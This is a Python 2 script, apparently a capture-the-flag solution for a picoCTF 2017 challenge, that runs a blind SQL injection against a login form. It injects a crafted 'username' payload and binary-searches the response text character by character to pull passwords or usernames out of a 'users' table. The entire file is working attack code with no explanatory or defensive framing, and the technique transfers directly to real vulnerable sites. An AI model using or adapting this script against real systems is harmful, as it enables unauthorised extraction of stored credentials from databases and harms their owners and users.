#!/usr/bin/env python

import urllib2
import requests
import urllib
import time
import socket
import sys

url = 'http://shell2017.picoctf.com:33838/'
req = urllib2.Request(url)

#column = 'user'
column = 'pass'
whereClause = ''
table = 'users'

endflag = False

for recNumber in xrange(0,100):
    for charNumber in xrange(1,100):
        min = 0x1f
        max = 128
        for attempt in xrange(0,8):
            xChar = (max - min)/2 + min
            payload = "1' or    (select case when (select substr(%s, %d, 1) from %s %s limit 1 offset %d) < '%c' then 1 else 0 end) or '1'='2" % (column, charNumber, table, whereClause, recNumber, xChar)
            #print payload
            values = {'username': payload, 'password':'garbage'}
            data = urllib.urlencode(values)
            
            start = time.time()
            try:
                html = requests.post(url, data = values).content
                #html = urllib2.urlopen(req,data, 2.5).read()
            except urllib2.URLError, e:
                print "%f" % (time.time() - start)
                print "%d %d %d %s" %(recNumber,charNumber,xChar, payload)
                print e
            except socket.timeout:
                print "socket timed out"
                print socket.timeout
            if 'Incorrect Password.' in html:
                max = xChar
            else:
                min = xChar
        
        if xChar == 0x1f or xChar == 0x7f:
            #print payload
            if endflag :
                quit()
            endflag = True
            sys.stdout.write("\n")
            break
        else:
            endflag = False
            sys.stdout.write("%c" % chr(xChar))
        sys.stdout.flush()
